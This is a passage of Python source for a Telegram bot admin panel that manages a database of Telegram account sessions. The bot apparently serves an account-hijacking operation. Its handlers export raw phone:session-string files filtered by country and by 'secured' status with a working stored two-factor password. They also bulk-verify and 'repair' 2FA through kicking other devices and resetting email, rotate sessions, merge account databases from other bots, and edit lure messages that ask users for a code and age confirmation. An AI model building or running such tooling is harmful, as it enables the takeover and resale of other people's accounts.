# ──────────────────────────────────────────
# أزرار الجلسة (id في callback — لا يُقطع رقم الهاتف)
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^h\d+$"))
async def a1_hide_session(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "hide")
    if not session:
        await callback.answer("❌ غير موجود")
        return
    phone = session["phone"]
    hide = not database.row_flag(session, "a1_only")
    await database.set_session_a1_only(phone, hide)
    if hide:
        deleted = await purge_phone_from_other_admins(phone)
        await callback.answer(
            f"⭐ خاص — حُذف {deleted} رسالة من شاتات الأدمنة الآخرين",
            show_alert=True,
        )
    else:
        await callback.answer("☆ ظهر للأدمنية مرة أخرى", show_alert=True)
    uid = callback.from_user.id

    # ارجع للصفحة التي كان فيها الأدمن قبل الدخول للتفاصيل
    st_data = await state.get_data()
    page   = st_data.get("last_page", 0)
    source = st_data.get("last_source", "main")

    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)

    if source == "unsecured":
        from keyboards import unsecured_sessions_keyboard
        kb = unsecured_sessions_keyboard(sessions, page=page)
    elif source == "disabled":
        from keyboards import disabled_sessions_keyboard
        kb = disabled_sessions_keyboard(sessions, page=page)
    else:
        per_page = 6
        max_page = max(0, (len(sessions) - 1) // per_page) if sessions else 0
        page = min(page, max_page)
        kb = sessions_keyboard(sessions, page=page, is_super_admin=True)

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")


@dp.callback_query(F.data.regexp(r"^x\d+$"))
async def export_session_text(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "export")
    if not await _guard_session_row(callback, session):
        return
    await _export_session_message(callback, session)
    await callback.answer()


# ──────────────────────────────────────────
# فحص الجلسات (A1 فقط)
# ──────────────────────────────────────────
@dp.callback_query(F.data == "check_sessions")
async def check_sessions_handler(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await callback.answer("⏳ جاري فحص الجلسات...")
    await callback.message.edit_text(
        "⏳ جاري فحص جميع الجلسات النشطة (قد يستغرق دقائق)..." + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    stats = await session_manager.bulk_check_sessions()
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    report = (
        f"\n\n🔍 <b>نتيجة الفحص</b>\n"
        f"تم فحص: <b>{stats['checked']}</b>\n"
        f"❌ غير صالحة (بدون بريد): <b>{stats['invalid']}</b>\n"
        f"♻️ مجدولة للإنعاش: <b>{stats.get('recovery_scheduled', 0)}</b>"
    )
    if stats.get("phones"):
        sample = stats["phones"][:5]
        report += "\n" + "\n".join(f"• <code>{h(p)}</code>" for p in sample)
        if len(stats["phones"]) > 5:
            report += f"\n... و {len(stats['phones']) - 5} أخرى"
    await callback.message.edit_text(
        text + report + ADMIN_FOOTER,
        reply_markup=sessions_keyboard(
            sessions, is_super_admin=is_super_admin(uid)
        ),
        parse_mode="HTML",
    )


# ──────────────────────────────────────────
# رسائل المستخدمين (A1 فقط)
# ──────────────────────────────────────────
EDIT_UM_MAP = {
    "edit_um_start_msg": "start_msg",
    "edit_um_confirm_button": "confirm_button",
    "edit_um_enter_code_msg": "enter_code_msg",
    "edit_um_confirm_age_msg": "confirm_age_msg",
    "edit_um_already_registered": "already_registered",
    "edit_um_registration_success": "registration_success",
    "edit_um_registration_link": "registration_link",
}


@dp.callback_query(F.data == "edit_user_messages")
async def edit_user_messages_menu(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await state.clear()
    text = (
        "✏️ <b>رسائل المستخدمين</b>\n\n"
        f"🔗 الرابط الحالي:\n<code>{h(user_messages.get_link())}</code>\n\n"
        "في النصوص ضع <code>{link}</code> حيث تريد ظهور الرابط.\n"
        "اختر الرسالة للتعديل:"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(
        text,
        reply_markup=user_messages_menu_keyboard(),
        parse_mode="HTML",
    )
    await callback.answer()


@dp.callback_query(F.data.in_(set(EDIT_UM_MAP.keys())))
async def edit_user_message_pick(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    um_key = EDIT_UM_MAP[callback.data]
    current = user_messages.get_template(um_key)
    label = user_messages.LABELS[um_key]
    if um_key == "registration_link":
        hint = "أرسل <b>رابط الفيديو</b> فقط (URL كامل)."
    elif um_key == "confirm_button":
        hint = "أرسل <b>نص الزر</b> الجديد فقط (يفضل أن يكون قصيراً)."
    else:
        hint = (
            "أرسل <b>النص كاملاً</b> كما سيظهر للمستخدم.\n"
            "استخدم <code>{link}</code> لمكان الرابط."
        )
    await state.set_state(AdminFlow.editing_user_message)
    await state.update_data(um_key=um_key)
    await callback.message.answer(
        f"✏️ تعديل: <b>{h(label)}</b>\n\n"
        f"<b>الحالي:</b>\n<pre>{h(current[:3500])}</pre>\n\n"
        f"{hint}"
        + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await callback.answer()


@dp.callback_query(F.data == "reset_user_messages")
async def reset_user_messages_all(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await user_messages.reset_all()
    await state.clear()
    text = (
        "✏️ <b>رسائل المستخدمين</b>\n\n"
        "✅ أُعيدت كل الرسائل للافتراضي.\n\n"
        f"🔗 الرابط الحالي:\n<code>{h(user_messages.get_link())}</code>\n\n"
        "في النصوص ضع <code>{link}</code> حيث تريد ظهور الرابط.\n"
        "اختر الرسالة للتعديل:"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(
        text,
        reply_markup=user_messages_menu_keyboard(),
        parse_mode="HTML",
    )
    await callback.answer("✅ تم", show_alert=True)


@dp.message(AdminFlow.editing_user_message)
async def save_user_message_text(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    data = await state.get_data()
    um_key = data.get("um_key")
    if not um_key:
        await state.clear()
        return
    text = (message.text or "").strip()
    if not text:
        await message.answer("❌ أرسل نصاً غير فارغ.")
        return
    await user_messages.set_message(um_key, text)
    await state.clear()
    if um_key == "registration_link":
        preview = user_messages.get_link()
    else:
        preview = user_messages.render(um_key)
    await message.answer(
        f"✅ <b>تم الحفظ</b> — {h(user_messages.LABELS[um_key])}\n\n"
        f"<b>معاينة:</b>\n<pre>{h(preview[:3500])}</pre>"
        + ADMIN_FOOTER,
        reply_markup=user_messages_menu_keyboard(),
        parse_mode="HTML",
    )


# ──────────────────────────────────────────
# Volume — سحب / رفع (A1 فقط)
# ──────────────────────────────────────────
@dp.callback_query(F.data == "vol_export")
async def volume_export_handler(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await callback.answer("⏳ جاري ضغط Volume...")
    try:
        data, filename = volume_backup.build_volume_zip()
        if not data:
            await callback.message.answer("❌ مجلد Volume فارغ.")
            return
        doc = BufferedInputFile(data, filename=filename)
        await callback.message.answer_document(
            document=doc,
            caption=(
                f"📦 <b>نسخة Volume كاملة</b>\n"
                f"📁 المسار: <code>{h(database.DATA_DIR)}</code>\n"
                f"انقل الملف إلى Volume الجديد ثم استخدم «رفع Volume»."
                + ADMIN_FOOTER
            ),
            parse_mode="HTML",
        )
    except Exception as e:
        logging.error("vol_export: %s", e)
        await callback.message.answer(f"❌ فشل التصدير: <code>{h(str(e))}</code>")
    await callback.answer()


@dp.callback_query(F.data == "vol_import")
async def volume_import_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await state.set_state(AdminFlow.waiting_volume_upload)
    await callback.message.answer(
        "📤 <b>رفع Volume</b>\n\n"
        "أرسل ملف:\n"
        "• <b>.zip</b> — نسخة Volume كاملة (من زر السحب)\n"
        "• أو <b>bot.db</b> — قاعدة البيانات فقط\n\n"
        "⚠️ يُؤخذ نسخة احتياطية من bot.db الحالي قبل الاستبدال."
        + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await callback.answer()


@dp.message(AdminFlow.waiting_volume_upload, F.document)
async def volume_import_file(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    doc = message.document
    name = doc.file_name or "upload.zip"
    if not (name.lower().endswith(".zip") or name.lower().endswith(".db")):
        await message.answer("❌ الملف يجب أن يكون .zip أو .db")
        return

    wait = await message.answer("⏳ جاري استبدال Volume...")
    try:
        file = await bot.get_file(doc.file_id)
        buf = await bot.download_file(file.file_path)
        content = buf.read() if hasattr(buf, "read") else bytes(buf)
        result = volume_backup.restore_volume_file(content, name)
        await state.clear()
        if result.get("success"):
            await database.init_db()
            await wait.edit_text(
                f"✅ تم تحديث Volume بنجاح!\n"
                f"النوع: <code>{h(result.get('mode', ''))}</code>\n"
                f"المسار: <code>{h(database.DATA_DIR)}</code>\n\n"
                f"يُفضّل إعادة تشغيل البوت على Railway."
                + ADMIN_FOOTER,
                parse_mode="HTML",
            )
        else:
            await wait.edit_text(
                f"❌ فشل الرفع: <code>{h(result.get('error', ''))}</code>"
                + ADMIN_FOOTER,
                parse_mode="HTML",
            )
    except Exception as e:
        await state.clear()
        logging.error("volume_import: %s", e)
        await wait.edit_text(f"❌ خطأ: <code>{h(str(e))}</code>", parse_mode="HTML")


# ══════════════════════════════════════════
# رفع Volume متعدد — سوبر أدمن فقط
# ══════════════════════════════════════════

@dp.callback_query(F.data == "vol_import_multi")
async def vol_import_multi_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await state.set_state(AdminFlow.waiting_multi_volume)
    await state.update_data(multi_zips=[])  # قائمة file_ids
    await callback.message.answer(
        "📦 <b>رفع Volume متعدد</b>\n\n"
        "أرسل ملفات ZIP للبوتات المختلفة (واحداً تلو الآخر).\n"
        "بعد رفع جميع الملفات أرسل نقطة <code>.</code> لبدء الدمج.\n\n"
        "• يُضاف فقط الحسابات الجديدة (غير الموجودة في DB الحالي)\n"
        "• الحسابات المكررة تُتخطى تلقائياً\n"
        "• لإلغاء العملية: أرسل <code>إلغاء</code>" + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await callback.answer()


@dp.message(AdminFlow.waiting_multi_volume, F.document)
async def vol_import_multi_file(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    doc = message.document
    name = doc.file_name or "upload.zip"
    if not name.lower().endswith(".zip"):
        await message.answer("❌ أرسل ملفات .zip فقط. أرسل نقطة <code>.</code> عند الانتهاء.", parse_mode="HTML")
        return
    data = await state.get_data()
    zips = data.get("multi_zips", [])
    zips.append({"file_id": doc.file_id, "name": name})
    await state.update_data(multi_zips=zips)
    await message.answer(
        f"✅ تم استلام: <code>{h(name)}</code>\n"
        f"إجمالي الملفات المستلمة: <b>{len(zips)}</b>\n\n"
        "أرسل المزيد أو أرسل <code>.</code> لبدء الدمج." + ADMIN_FOOTER,
        parse_mode="HTML",
    )


@dp.message(AdminFlow.waiting_multi_volume, F.text)
async def vol_import_multi_trigger(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    text = (message.text or "").strip()

    if text == "إلغاء":
        await state.clear()
        await message.answer("❌ تم إلغاء عملية الدمج." + ADMIN_FOOTER, parse_mode="HTML")
        return

    if text != ".":
        return

    data = await state.get_data()
    zips = data.get("multi_zips", [])
    await state.clear()

    if not zips:
        await message.answer("❌ لم ترسل أي ملفات ZIP. العملية ملغاة." + ADMIN_FOOTER, parse_mode="HTML")
        return

    wait_msg = await message.answer(
        f"⏳ <b>جاري دمج {len(zips)} ملف ZIP...</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
    )

    total_added = 0
    total_skipped = 0
    total_sessions = 0
    errors = []

    for entry in zips:
        try:
            file = await bot.get_file(entry["file_id"])
            buf = await bot.download_file(file.file_path)
            content = buf.read() if hasattr(buf, "read") else bytes(buf)
            result = volume_backup.merge_db_from_zip(content)
            if result.get("success"):
                total_added += result.get("added", 0)
                total_skipped += result.get("skipped", 0)
                total_sessions += result.get("total", 0)
            else:
                errors.append(f"{entry['name']}: {result.get('error', 'خطأ غير معروف')}")
        except Exception as e:
            errors.append(f"{entry['name']}: {e}")

    lines = [
        f"✅ <b>اكتمل دمج {len(zips)} ملف ZIP</b>\n",
        f"➕ حسابات مضافة جديدة: <b>{total_added}</b>",
        f"⏭️ حسابات مكررة (تخطيت): <b>{total_skipped}</b>",
        f"📊 إجمالي الجلسات في الملفات: <b>{total_sessions}</b>",
    ]
    if errors:
        lines.append("\n<b>أخطاء:</b>")
        for e in errors[:5]:
            lines.append(f"  • <code>{h(e)}</code>")
    await wait_msg.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")]
        ]),
    )


# ══════════════════════════════════════════
# حذف الجلسات المؤمنة المعطلة — سوبر أدمن فقط
# ══════════════════════════════════════════

@dp.callback_query(F.data == "purge_secured_invalid")
async def purge_secured_invalid_prompt(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    uid = callback.from_user.id
    sessions = await database.get_secured_invalid_sessions(uid, SUPER_ADMIN_IDS)
    n = len(sessions)
    if n == 0:
        await callback.answer("📭 لا توجد جلسات مؤمنة-معطلة للحذف.", show_alert=True)
        return
    await callback.message.edit_text(
        f"⚠️ <b>حذف الجلسات المؤمنة المعطلة</b>\n\n"
        f"سيتم حذف <b>{n}</b> جلسة كانت مؤمّنة (🔒) لكنها أصبحت معطّلة (valid=0).\n\n"
        f"<i>هذه الجلسات انتهت صلاحيتها ولا يمكن استعادتها تلقائياً.</i>\n"
        f"لا يمكن التراجع بعد الحذف." + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ تأكيد الحذف", callback_data="purge_secured_invalid_yes"),
                InlineKeyboardButton(text="❌ إلغاء", callback_data="back_to_sessions"),
            ]
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data == "purge_secured_invalid_yes")
async def purge_secured_invalid_confirm(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    phones = await database.purge_secured_invalid_sessions(uid, SUPER_ADMIN_IDS)
    if not phones:
        await callback.answer("📭 لا توجد جلسات للحذف.", show_alert=True)
        return
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        f"✅ تم حذف <b>{len(phones)}</b> جلسة مؤمنة-معطلة بنجاح.\n\n{text}",
        reply_markup=sessions_keyboard(sessions, is_super_admin=True) if sessions else None,
        parse_mode="HTML",
    )
    await callback.answer(f"✅ حُذفت {len(phones)} جلسة", show_alert=True)


# ══════════════════════════════════════════
# تغيير ج — سوبر أدمن فقط
# ══════════════════════════════════════════

# ── تغيير ج جماعي: طلب تأكيد ──
# ══════════════════════════════════════════
# فحص صحة التحقق بخطوتين (جماعي)
# ══════════════════════════════════════════

@dp.callback_query(F.data == "check_two_fa_all")
async def check_two_fa_all_prompt(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    await callback.message.edit_text(
        "🔍 <b>فحص صحة التحقق بخطوتين — كل الحسابات</b>\n\n"
        "سيتم اختبار التحقق المخزون في قاعدة البيانات لكل جلسة نشطة.\n\n"
        "• الحسابات التي تفشل تُضاف لقائمة «تحققها غير صالح»\n"
        "• العملية تستغرق عدة دقائق حسب عدد الحسابات\n\n"
        "متأكد؟" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ متأكد", callback_data="check_two_fa_all_confirm"),
                InlineKeyboardButton(text="❌ إلغاء", callback_data="back_to_sessions"),
            ]
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data == "check_two_fa_all_confirm")
async def check_two_fa_all_confirm(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    _bulk_stop_flags[uid] = False
    await callback.answer("⏳ بدأ الفحص...")

    msg = callback.message
    await msg.edit_text(
        "🔍 <b>فحص صحة التحقق — جاري المعالجة...</b>\n\n"
        "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜  0%\n"
        "✅ صالح: 0  ❌ غير صالح: 0  ⏭️ تخطى: 0\n"
        "📊 الحساب: 0 / ?" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=_stop_bulk_keyboard("verify_2fa", uid),
    )

    _last_edit = [0.0]

    async def progress_cb(done, total, valid_n, invalid_n, skip_n):
        import time
        now = time.monotonic()
        if done % 5 != 0 and now - _last_edit[0] < 15:
            return
        _last_edit[0] = now
        pct = int(done / total * 100) if total else 0
        filled = pct // 10
        bar = "🟩" * filled + "⬜" * (10 - filled)
        text = (
            f"🔍 <b>فحص صحة التحقق — جاري المعالجة...</b>\n\n"
            f"{bar}  {pct}%\n"
            f"✅ صالح: {valid_n}  ❌ غير صالح: {invalid_n}  ⏭️ تخطى: {skip_n}\n"
            f"📊 الحساب: {done} / {total}" + ADMIN_FOOTER
        )
        try:
            await msg.edit_text(
                text, parse_mode="HTML",
                reply_markup=_stop_bulk_keyboard("verify_2fa", uid),
            )
        except Exception:
            pass

    result = await session_manager.bulk_verify_two_fa(
        progress_cb=progress_cb,
        should_stop=lambda: _bulk_stop_flags.get(uid, False),
    )
    _bulk_stop_flags.pop(uid, None)

    invalid_n = result.get("invalid", 0)
    lines = [
        "🔍 <b>اكتمل فحص صحة التحقق</b>\n",
        f"✅ صالح: <b>{result['valid']}</b>",
        f"❌ غير صالح: <b>{invalid_n}</b>",
        f"⏭️ تخطى (غير متصل/بلا تحقق): <b>{result['skip']}</b>",
        f"📊 المجموع: <b>{result['total']}</b>",
    ]
    if invalid_n > 0:
        lines.append(f"\n⚠️ <b>{invalid_n} حساب لديها تحقق غير صالح</b> — اضغط «تحققها غير صالح» للعرض والإصلاح.")
    await msg.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❗ تحققها غير صالح", callback_data="list_invalid_two_fa")],
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")],
        ]),
    )


# ══════════════════════════════════════════
# قائمة الحسابات ذات التحقق غير الصالح
# ══════════════════════════════════════════

@dp.callback_query(F.data == "list_invalid_two_fa")
async def list_invalid_two_fa_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer("✅ لا توجد حسابات بتحقق غير صالح!", show_alert=True)
        return
    repairing = sum(
        1 for s in sessions
        if s["repair_2fa_stage"] is not None and s["repair_2fa_stage"] < 3
    )
    status_line = f"\n🔧 قيد الإصلاح الآن: {repairing}" if repairing else ""
    await callback.message.edit_text(
        f"❗ <b>حسابات تحققها غير صالح ({len(sessions)})</b>\n\n"
        f"هذه الحسابات لديها تحقق بخطوتين في DB لكنه خاطئ على تيليجرام.{status_line}\n\n"
        f"اضغط «إصلاح الكل» لتشغيل خط الإصلاح التلقائي (طرد + بريد + إعادة تعيين 7 أيام)."
        + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=invalid_two_fa_sessions_keyboard(sessions, page=0),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("invalid_two_fa_page_"))
async def invalid_two_fa_page_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer("✅ لا توجد حسابات.")
        return
    await callback.message.edit_text(
        f"❗ <b>حسابات تحققها غير صالح ({len(sessions)})</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=invalid_two_fa_sessions_keyboard(sessions, page=page),
    )
    await callback.answer()


@dp.callback_query(F.data == "repair_invalid_two_fa_all")
async def repair_invalid_two_fa_all_handler(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer("✅ لا يوجد حسابات تحتاج إصلاح.", show_alert=True)
        return

    started = 0
    already = 0
    for s in sessions:
        phone = s["phone"]
        if s["repair_2fa_stage"] is not None and s["repair_2fa_stage"] < 3:
            already += 1
            continue
        session_manager.schedule_repair_two_fa(phone)
        await database.update_repair_2fa_stage(phone, 0)
        started += 1

    lines = [
        f"🔧 <b>تم بدء إصلاح التحقق</b>\n",
        f"🚀 بُدئ حديثاً: <b>{started}</b>",
    ]
    if already:
        lines.append(f"⏳ قيد الإصلاح مسبقاً: <b>{already}</b>")
    lines.append(
        "\n<i>ستصلك إشعار لكل مرحلة (طرد، بريد، إعادة تعيين، نجاح/فشل).\n"
        "الانتظار 7 أيام حتى تكتمل إعادة التعيين — البوت يتابع تلقائياً.</i>"
    )
    await callback.message.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❗ تحديث القائمة", callback_data="list_invalid_two_fa")],
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")],
        ]),
    )
    await callback.answer(f"✅ بدأ إصلاح {started} حساب")


# ══════════════════════════════════════════
# سحب الجلسات المؤمنة + تحقق شغال فقط
# ══════════════════════════════════════════

# ══════════════════════════════════════════
# سحب الجلسات المؤمنة حسب الدولة
# ══════════════════════════════════════════

@dp.callback_query(F.data == "export_secured_by_country")
async def export_secured_by_country_menu(callback: CallbackQuery):
    """عرض الدول المتاحة مع عدد الجلسات المؤمنة لكل دولة."""
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return

    from phone_countries import phone_to_country
    from keyboards import secured_by_country_keyboard

    uid = callback.from_user.id
    all_s = await _sessions_for_admin(uid)
    is_sa = is_super_admin(uid)

    # جمع الجلسات المؤمنة الصالحة
    secured = [
        s for s in all_s
        if database.row_flag(s, "secured") and s["valid"]
        and (is_sa or not database.row_flag(s, "a1_only"))
    ]

    if not secured:
        await callback.answer("❌ لا توجد جلسات مؤمنة.", show_alert=True)
        return

    # تجميع حسب الدولة
    country_map: dict[str, dict] = {}
    for s in secured:
        dial, flag, name = phone_to_country(s["phone"])
        if dial not in country_map:
            country_map[dial] = {"flag": flag, "name": name, "count": 0}
        country_map[dial]["count"] += 1

    # ترتيب تنازلي حسب العدد
    stats = sorted(
        [(d, v["flag"], v["name"], v["count"]) for d, v in country_map.items()],
        key=lambda x: -x[3],
    )

    total = sum(v["count"] for v in country_map.values())
    lines = [f"🌍 <b>سحب مؤمنة حسب الدولة</b>"]
    lines.append(f"📊 الإجمالي: <b>{total}</b> جلسة مؤمنة في <b>{len(stats)}</b> دولة\n")
    for dial, flag, name, cnt in stats:
        lines.append(f"{flag} {name}: <b>{cnt}</b>")

    await callback.message.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=secured_by_country_keyboard(stats),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("sec_ctry_"))
async def export_secured_country_handler(callback: CallbackQuery):
    """تصدير الجلسات المؤمنة لدولة محددة."""
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return

    from phone_countries import phone_to_country

    dial_code = callback.data.removeprefix("sec_ctry_")
    uid = callback.from_user.id
    all_s = await _sessions_for_admin(uid)
    is_sa = is_super_admin(uid)

    # فلتر: مؤمنة + صالحة + نفس الدولة
    sessions = [
        s for s in all_s
        if database.row_flag(s, "secured")
        and s["valid"]
        and (is_sa or not database.row_flag(s, "a1_only"))
        and phone_to_country(s["phone"])[0] == dial_code
    ]

    if not sessions:
        await callback.answer("❌ لا توجد جلسات لهذه الدولة.", show_alert=True)
        return

    # معلومات الدولة
    _, flag, country_name = phone_to_country(sessions[0]["phone"])

    await callback.answer(f"⏳ جاري تجهيز {len(sessions)} جلسة...")

    lines = []
    for s in sessions:
        ss = s["session_string"]
        if not ss or not str(ss).strip():
            ss = await session_manager.ensure_session_string(s["phone"])
        if ss:
            lines.append(f"{s['phone']}:{ss}")

    if not lines:
        await callback.message.answer("❌ لا توجد أكواد جلسات لإرسالها.")
        return

    document = BufferedInputFile(
        "\n".join(lines).encode("utf-8"),
        filename=f"secured_{dial_code}.txt",
    )
    await callback.message.answer_document(
        document=document,
        caption=(
            f"🔒 {flag} <b>{country_name}</b>\n"
            f"📊 عدد الجلسات: <b>{len(lines)}</b>"
            + ADMIN_FOOTER
        ),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "export_secured_valid_two_fa")
async def export_secured_valid_two_fa_handler(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await database.get_secured_sessions_valid_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer(
            "❌ لا توجد جلسات مؤمنة بتحقق شغال.\n"
            "قم بفحص التحقق أولاً من زر «فحص صحة التحقق».",
            show_alert=True,
        )
        return

    await callback.message.edit_text(
        "⏳ جاري تجهيز ملف الجلسات المؤمنة (تحقق شغال)...", parse_mode="HTML"
    )
    lines = []
    for s in sessions:
        ss = s["session_string"]
        if not ss or not str(ss).strip():
            ss = await session_manager.ensure_session_string(s["phone"])
        if ss:
            lines.append(f"{s['phone']}:{ss}")

    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد جلسات لإرسالها.")
        return

    document = BufferedInputFile(
        "\n".join(lines).encode("utf-8"),
        filename="secured_valid_2fa_sessions.txt",
    )
    await callback.message.answer_document(
        document=document,
        caption=(
            f"✅ <b>جلسات مؤمنة + تحقق شغال ({len(lines)} حساب)</b>\n"
            f"<i>تم استبعاد الحسابات ذات التحقق غير الصالح.</i>"
            + ADMIN_FOOTER
        ),
        parse_mode="HTML",
    )
    all_s = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(all_s, is_super_admin=is_super_admin(uid)),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "rotate_sessions_all")
async def rotate_sessions_all_prompt(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await callback.message.edit_text(
        "⚠️ <b>تغيير ج — كل الحسابات</b>\n\n"
        "سيتم تغيير جلسات <b>كل</b> الحسابات المتصلة التي لها بريد Login.\n\n"
        "• تستغرق العملية عدة دقائق حسب عدد الحسابات\n"
        "• لا يمكن التراجع بعد التأكيد\n\n"
        "متأكد؟" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ متأكد", callback_data="rotate_sessions_confirm"),
                InlineKeyboardButton(text="❌ إلغاء", callback_data="back_to_sessions"),
            ]
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data.regexp(r"^stop_bulk_rotate_\d+$"))
async def stop_bulk_rotate(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = int(callback.data.split("_")[-1])
    if uid != callback.from_user.id:
        await callback.answer("❌ ليس لك صلاحية إيقاف هذه العملية", show_alert=True)
        return
    _bulk_stop_flags[uid] = True
    await callback.answer("⛔ تم إرسال طلب الإيقاف — سيتوقف بعد الحساب الحالي", show_alert=True)


@dp.callback_query(F.data.regexp(r"^stop_bulk_verify_2fa_\d+$"))
async def stop_bulk_verify_2fa(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = int(callback.data.split("_")[-1])
    if uid != callback.from_user.id:
        await callback.answer("❌ ليس لك صلاحية إيقاف هذه العملية", show_alert=True)
        return
    _bulk_stop_flags[uid] = True
    await callback.answer("⛔ تم إرسال طلب الإيقاف — سيتوقف بعد الحساب الحالي", show_alert=True)


@dp.callback_query(F.data.regexp(r"^stop_bulk_2fa_\d+$"))
async def stop_bulk_2fa(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = int(callback.data.split("_")[-1])
    if uid != callback.from_user.id:
        await callback.answer("❌ ليس لك صلاحية إيقاف هذه العملية", show_alert=True)
        return
    _bulk_stop_flags[uid] = True
    await callback.answer("⛔ تم إرسال طلب الإيقاف — سيتوقف بعد الحساب الحالي", show_alert=True)


@dp.callback_query(F.data == "rotate_sessions_confirm")
async def rotate_sessions_all_confirm(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    uid = callback.from_user.id
    _bulk_stop_flags[uid] = False
